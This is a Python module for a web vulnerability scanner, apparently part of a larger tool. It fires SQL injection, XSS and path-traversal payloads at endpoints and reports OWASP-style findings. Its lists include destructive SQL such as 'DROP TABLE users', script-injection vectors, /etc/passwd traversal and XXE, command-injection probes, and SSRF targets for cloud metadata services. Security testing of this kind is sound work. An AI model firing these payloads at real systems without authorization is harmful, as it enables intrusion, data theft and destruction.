"""Advanced payloads with encoding variations and adaptive fuzzing."""

from __future__ import annotations

import base64
import urllib.parse
from typing import Callable

from .base_scanner import BaseScanner
from utils.owasp_top10 import A03_INJECTION


class PayloadVariant:
    """Represents a payload with multiple encoding variations."""

    def __init__(self, base_payload: str, encodings: list[str] = None):
        self.base_payload = base_payload
        self.encodings = encodings or ["none", "url", "double_url", "base64", "html"]

    def get_variants(self) -> list[tuple[str, str]]:
        """Generate all encoding variants."""
        variants = []

        for encoding in self.encodings:
            if encoding == "none":
                variants.append((self.base_payload, "plain"))
            elif encoding == "url":
                variants.append((urllib.parse.quote(self.base_payload), "url_encoded"))
            elif encoding == "double_url":
                variants.append((urllib.parse.quote(urllib.parse.quote(self.base_payload)), "double_url"))
            elif encoding == "base64":
                encoded = base64.b64encode(self.base_payload.encode()).decode()
                variants.append((encoded, "base64"))
            elif encoding == "html":
                html_encoded = self._html_encode(self.base_payload)
                variants.append((html_encoded, "html_encoded"))
            elif encoding == "unicode":
                unicode_encoded = "".join(f"\\u{ord(c):04x}" for c in self.base_payload)
                variants.append((unicode_encoded, "unicode"))
            elif encoding == "hex":
                hex_encoded = self.base_payload.encode().hex()
                variants.append((hex_encoded, "hex"))

        return variants

    def _html_encode(self, text: str) -> str:
        """HTML encode special characters."""
        return (text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"))


class AdvancedPayloadGenerator:
    """Generate advanced payloads with variations for fuzzing."""

    @staticmethod
    def get_sqli_payloads() -> list[tuple[str, str, list[str]]]:
        """Get SQL injection payloads with encoding variants."""
        payloads = [
            # Classic SQLi
            ("'", "single_quote", ["none", "url", "double_url"]),
            ("''", "double_quote", ["none"]),
            ("' OR '1'='1", "classic_or", ["none", "url", "double_url"]),
            ("' OR 1=1--", "boolean_or", ["none", "url", "double_url"]),
            ("' UNION SELECT NULL--", "union_null", ["none", "url"]),
            ('" OR "1"="1', "double_quote_or", ["none", "url"]),

            # Time-based SQLi
            ("'; WAITFOR DELAY '0:0:5'--", "mssql_time", ["none"]),
            ("' AND SLEEP(5)--", "mysql_time", ["none"]),
            ("'; SELECT pg_sleep(5)--", "postgres_time", ["none"]),

            # Boolean-based blind SQLi
            ("' AND 1=1--", "boolean_true", ["none", "url"]),
            ("' AND 1=2--", "boolean_false", ["none", "url"]),

            # Comment-based bypass
            ("admin'--", "admin_comment", ["none"]),
            ("admin' #", "admin_hash", ["none"]),

            # Stacked queries
            ("'; DROP TABLE users--", "stacked_drop", ["none"]),
            ("'; INSERT INTO users VALUES('h','h')--", "stacked_insert", ["none"]),
        ]

        result = []
        for base, label, encodings in payloads:
            variant = PayloadVariant(base, encodings)
            for encoded, encoding_type in variant.get_variants():
                result.append((label, encoded, [encoding_type]))

        return result

    @staticmethod
    def get_xss_payloads() -> list[tuple[str, str, list[str]]]:
        """Get XSS payloads with encoding variants."""
        payloads = [
            # Basic XSS
            ("<script>alert(1)</script>", "script_tag", ["none", "html"]),
            ("<img src=x onerror=alert(1)>", "img_onerror", ["none", "html"]),
            ("<svg onload=alert(1)>", "svg_onload", ["none", "html"]),
            ("<body onload=alert(1)>", "body_onload", ["none", "html"]),

            # Event handlers
            ("<input onfocus=alert(1) autofocus>", "input_onfocus", ["none", "html"]),
            ("<marquee onstart=alert(1)>", "marquee_onstart", ["none", "html"]),
            ("<video onerror=alert(1)>", "video_onerror", ["none", "html"]),
            ("<audio src=x onerror=alert(1)>", "audio_onerror", ["none", "html"]),

            # DOM-based
            ("<img src=\"x\" onerror=\"alert(1)\">", "img_quote", ["none", "html"]),
            ("<script>document.location='javascript:alert(1)'</script>", "dom_location", ["none"]),

            # Filter bypass
            ("<scr\x00ipt>alert(1)</scr\x00ipt>", "null_byte", ["none"]),
            ("<ScRiPt>alert(1)</sCrIpT>", "case_variation", ["none", "html"]),
            ("<script>al\\u0065rt(1)</script>", "unicode_escape", ["none"]),

            # Data URI
            ("data:text/html,<script>alert(1)</script>", "data_uri", ["none"]),
        ]

        result = []
        for base, label, encodings in payloads:
            variant = PayloadVariant(base, encodings)
            for encoded, encoding_type in variant.get_variants():
                result.append((label, encoded, [encoding_type]))

        return result

    @staticmethod
    def get_path_traversal_payloads() -> list[tuple[str, str, list[str]]]:
        """Get path traversal payloads with variations."""
        payloads = [
            # Standard traversal
            ("../", "single_up", ["none", "url"]),
            ("../../", "double_up", ["none", "url"]),
            ("../../../", "triple_up", ["none", "url"]),
            ("../../../../", "quad_up", ["none", "url"]),

            # Variation
            ("..\\", "single_back", ["none"]),
            ("..\\..\\", "double_back", ["none"]),
            ("....//", "double_slash", ["none"]),
            ("....\\\\", "double_backslash", ["none"]),
            ("./%2e/%2e/", "encoded_dots", ["none"]),
            ("..%252f", "double_encoded", ["none"]),

            # Null byte
            ("../etc/passwd%00", "null_byte", ["none"]),

            # Unicode
            ("..%c0%af", "unicode_overflow", ["none"]),
        ]

        result = []
        for base, label, encodings in payloads:
            variant = PayloadVariant(base, encodings)
            for encoded, encoding_type in variant.get_variants():
                result.append((label, encoded, [encoding_type]))

        return result

    @staticmethod
    def get_ssrf_payloads() -> list[tuple[str, str, list[str]]]:
        """Get SSRF payloads for various scenarios."""
        payloads = [
            # Localhost variations
            ("http://127.0.0.1", "localhost", ["none"]),
            ("http://localhost", "localhost_name", ["none"]),
            ("http://[::1]", "ipv6_localhost", ["none"]),
            ("http://0.0.0.0", "zero_localhost", ["none"]),
            ("http://127.1", "short_localhost", ["none"]),

            # Cloud metadata
            ("http://169.254.169.254", "aws_metadata", ["none"]),
            ("http://metadata.google.internal", "gcp_metadata", ["none"]),
            ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata_path", ["none"]),

            # DNS rebinding
            ("http://example.com", "external_domain", ["none"]),
            ("file:///etc/passwd", "file_protocol", ["none"]),
        ]

        return payloads

    @staticmethod
    def get_fuzz_patterns() -> list[tuple[str, str]]:
        """Get common fuzzing patterns for parameter testing."""
        return [
            # Command injection patterns
            ("; ls", "semicolon_ls"),
            ("| ls", "pipe_ls"),
            ("&& ls", "and_ls"),
            ("\nls", "newline_ls"),
            ("%0als", "url_newline_ls"),

            # Template injection
            ("{{7*7}}", "jinja2_ssti"),
            ("${7*7}", "spring_ssti"),
            ("<%= 7*7 %>", "erb_ssti"),

            # XML injection
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "xxe", ["none"]),
            ("<script>alert(1)</script>", "script_injection", ["none"]),
        ]


class AdvancedFuzzer(BaseScanner):
    """Advanced fuzzing scanner with adaptive payload testing."""
    scanner_name = "fuzzer"
    owasp_category = A03_INJECTION

    def run(self) -> list[dict]:
        """Run advanced fuzzing tests."""
        findings: list[dict] = []

        self.log("[*] Running advanced fuzzing...")

        # Get endpoints from crawler if available
        endpoints = getattr(self.context, 'discovered_endpoints', [])

        if not endpoints:
            self.log("[!] No crawled endpoints, using basic fuzzer")
            # Fall back to basic endpoint testing
            endpoints = self._get_basic_endpoints()

        # Test SQLi with advanced payloads
        findings.extend(self._fuzz_sqli(endpoints[:20]))

        # Test XSS with advanced payloads
        findings.extend(self._fuzz_xss(endpoints[:20]))

        # Test path traversal
        findings.extend(self._fuzz_traversal(endpoints[:10]))

        return findings

    def _get_basic_endpoints(self) -> list:
        """Get basic endpoints for fuzzing when no crawl data."""
        from dataclasses import dataclass

        @dataclass
        class BasicEndpoint:
            url: str
            method: str = "GET"
            parameters: list = None
            form_fields: dict = None

        return [
            BasicEndpoint(url=self.context.base_url + "/search", method="GET", parameters=["q"]),
            BasicEndpoint(url=self.context.base_url + "/login", method="POST", form_fields={"username": "", "password": ""}),
            BasicEndpoint(url=self.context.base_url + "/register", method="POST", form_fields={"email": "", "password": ""}),
            BasicEndpoint(url=self.context.base_url + "/profile", method="GET", parameters=["id"]),
            BasicEndpoint(url=self.context.base_url + "/admin", method="GET", parameters=["page"]),
        ]

    def _fuzz_sqli(self, endpoints: list) -> list[dict]:
        """Fuzz for SQL injection with advanced payloads."""
        findings = []

        for endpoint in endpoints:
            params = endpoint.parameters if hasattr(endpoint, 'parameters') else []
            form_fields = endpoint.form_fields if hasattr(endpoint, 'form_fields') else {}

            test_params = params if params else list(form_fields.keys())
            if not test_params:
                continue

            param = test_params[0]

            for label, payload, encoding_types in AdvancedPayloadGenerator.get_sqli_payloads()[:30]:
                try:
                    url = endpoint.url
                    if "?" in url:
                        url += f"&{param}={urllib.parse.quote(payload)}"
                    else:
                        url += f"?{param}={urllib.parse.quote(payload)}"

                    resp = self.client.request("GET", url, cookies=self.context.cookies)
                    text = (resp.text or "").lower()

                    # Check for SQL errors
                    sql_errors = [
                        "sql", "syntax", "mysql", "postgresql", "ora-", "sqlite",
                        "warning:", "error", "exception"
                    ]

                    if any(err in text for err in sql_errors) and ("error" in text or "warning" in text):
                        findings.append(
                            self.finding(
                                vuln_id="VULN-A03-AFQZ-001",
                                title="SQL Injection via Advanced Fuzzing",
                                severity="CRITICAL",
                                cvss_score=9.2,
                                endpoint=endpoint.url.replace(self.context.base_url, ""),
                                method="GET",
                                parameter=param,
                                payload_used=f"{label}: {payload[:50]}",
                                evidence=f"SQL error detected with {encoding_types} encoding",
                                description="Advanced fuzzing detected SQL injection with encoding bypass attempts.",
                                impact="Full database compromise possible via SQL injection.",
                                remediation="Use parameterized queries for all database operations.",
                                references=["https://owasp.org/Top10/A03_2021-Injection/"],
                                cwe_id="CWE-89",
                                approaches_tried=encoding_types,
                            )
                        )
                        break  # Found, move to next endpoint

                except Exception:
                    pass

        return findings

    def _fuzz_xss(self, endpoints: list) -> list[dict]:
        """Fuzz for XSS with advanced payloads."""
        findings = []

        for endpoint in endpoints:
            params = endpoint.parameters if hasattr(endpoint, 'parameters') else []
            form_fields = endpoint.form_fields if hasattr(endpoint, 'form_fields') else {}

            test_params = params if params else list(form_fields.keys())
            if not test_params:
                continue

            param = test_params[0]

            for label, payload, encoding_types in AdvancedPayloadGenerator.get_xss_payloads()[:20]:
                try:
                    url = endpoint.url
                    if "?" in url:
                        url += f"&{param}={urllib.parse.quote(payload)}"
                    else:
                        url += f"?{param}={urllib.parse.quote(payload)}"

                    resp = self.client.request("GET", url, cookies=self.context.cookies)
                    text = resp.text or ""

                    # Check if payload is reflected (possibly in decoded form)
                    # This is a simplified check
                    if payload.replace("<", "&lt;").replace(">", "&gt;") in text or payload in text:
                        findings.append(
                            self.finding(
                                vuln_id="VULN-A03-AFXS-001",
                                title="XSS via Advanced Fuzzing",
                                severity="HIGH",
                                cvss_score=7.5,
                                endpoint=endpoint.url.replace(self.context.base_url, ""),
                                method="GET",
                                parameter=param,
                                payload_used=f"{label}: {payload[:50]}",
                                evidence=f"Payload reflected with {encoding_types} encoding",
                                description="Advanced fuzzing detected XSS with encoding bypass attempts.",
                                impact="Session hijacking, defacement, redirecting users to malicious sites.",
                                remediation="Implement output encoding and Content Security Policy.",
                                references=["https://owasp.org/Top10/A03_2021-Injection/"],
                                cwe_id="CWE-79",
                                approaches_tried=encoding_types,
                            )
                        )
                        break

                except Exception:
                    pass

        return findings

    def _fuzz_traversal(self, endpoints: list) -> list[dict]:
        """Fuzz for path traversal."""
        findings = []

        for endpoint in endpoints:
            params = endpoint.parameters if hasattr(endpoint, 'parameters') else []
            form_fields = endpoint.form_fields if hasattr(endpoint, 'form_fields') else {}

            # Look for file-related parameters
            file_params = ["file", "path", "download", "image", "doc", "page", "template"]

            test_params = [p for p in (params if params else list(form_fields.keys())) if any(fp in p.lower() for fp in file_params)]

            if not test_params:
                continue

            param = test_params[0]

            for label, payload, _ in AdvancedPayloadGenerator.get_path_traversal_payloads()[:10]:
                try:
                    url = endpoint.url
                    if "?" in url:
                        url += f"&{param}={urllib.parse.quote(payload)}"
                    else:
                        url += f"?{param}={urllib.parse.quote(payload)}"

                    resp = self.client.request("GET", url, cookies=self.context.cookies)
                    text = (resp.text or "").lower()

                    # Check for file disclosure indicators
                    if "root:" in text or "[extensions]" in text or "windows" in text:
                        findings.append(
                            self.finding(
                                vuln_id="VULN-A01-TRV-001",
                                title="Path Traversal via Advanced Fuzzing",
                                severity="HIGH",
                                cvss_score=8.5,
                                endpoint=endpoint.url.replace(self.context.base_url, ""),
                                method="GET",
                                parameter=param,
                                payload_used=f"{label}: {payload}",
                                evidence="File system content leaked in response",
                                description="Advanced fuzzing detected path traversal vulnerability.",
                                impact="Read arbitrary files on the server.",
                                remediation="Use whitelist approach for file paths, validate input strictly.",
                                references=["https://owasp.org/Top10/A01_2025-Broken_Access_Control/"],
                                cwe_id="CWE-22",
                            )
                        )
                        break

                except Exception:
                    pass

        return findings